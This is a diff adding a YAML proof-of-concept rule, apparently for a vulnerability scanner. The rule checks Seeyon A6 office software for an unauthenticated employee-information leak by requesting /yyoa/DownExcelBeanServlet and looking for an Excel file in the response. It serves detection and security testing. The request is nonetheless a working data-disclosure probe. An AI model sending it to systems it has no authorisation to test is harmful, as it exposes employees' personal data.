@@ -1,0 +1,11 @@
+name: poc-yaml-seeyon-a6-employee-info-leak
+rules:
+    - method: GET
+      path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+      expression:
+        response.status == 200 && response.body.bcontains(b"[Content_Types].xml") && response.body.bcontains(b"Excel.Sheet")
+detail:
+  author: sakura404x
+  version: 致远A6
+  links:
+    - https://github.com/apachecn/sec-wiki/blob/c73367f88026f165b02a1116fe1f1cd2b8e8ac37/doc/unclassified/zhfly3351.md
